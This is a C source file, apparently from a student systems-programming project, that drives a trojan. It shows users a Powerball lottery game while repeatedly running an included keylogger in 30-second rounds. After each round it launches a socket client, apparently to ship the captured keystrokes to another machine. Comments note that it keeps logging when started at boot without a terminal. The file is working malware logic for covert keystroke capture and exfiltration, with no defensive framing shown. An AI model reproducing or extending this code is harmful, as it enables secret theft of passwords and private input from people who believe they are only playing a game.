#include "Keylogger/keylogger.c"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include "powerBall.h"

int trigger = 30000;
void time_30s(int trigger);

int main (){
        // flag indicate if current program is running in the terminal
        int flag = 0;
        // result indicate how many powerBall the user win
        int result = 0;
        
         
        if (isatty(0)) {  // check whether running under terminal
                flag = 1;
        }
        while (result != 3) {
                if (flag == 1) {   //if first time running main, play power ball
                        result = PBmain();
                }
                // if win 1 or 2 powerBall it will skill current session
                // in this 30s it will not do anything
                if (result != 1 && result != 2) {
                        keylogger_start();
                        time_30s(trigger);
                        keylogger_end();
                        system("/CSE2431_Project/socket/client");
                }else{ // if run from start up, just keep the function of keylogger and socket
                        // wait 30 second for another round
                        time_30s(trigger);
                }
                result = 0;
        }
}

// 30 seconds timer
void time_30s(int trigger){
        int msec = 0;
        clock_t before = clock();
        /* wait time to elapse 30s */
        do {
                clock_t difference = clock() - before;
                msec = difference * 1000 / CLOCKS_PER_SEC;
        } while ( msec < trigger );
}
